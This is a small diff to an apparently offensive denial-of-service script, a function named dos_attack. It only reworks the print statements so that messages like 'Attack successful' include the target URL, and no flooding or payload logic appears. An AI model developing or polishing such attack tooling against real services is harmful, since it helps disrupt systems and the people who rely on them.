@@ -36,9 +36,9 @@ def dos_attack(target_url, user_agent, payload):
         response = client.recv(4096)
         
         if b"200 OK" in response:
-            print("Response: 200 OK - Attack successful.")
+            print(f"Response: 200 OK - Attack successful for {target_url}")
         else:
-            print("Response:", response.decode())
+            print(f"Response: {response.decode()} for {target_url}")
         
         client.close()
     except Exception as e:
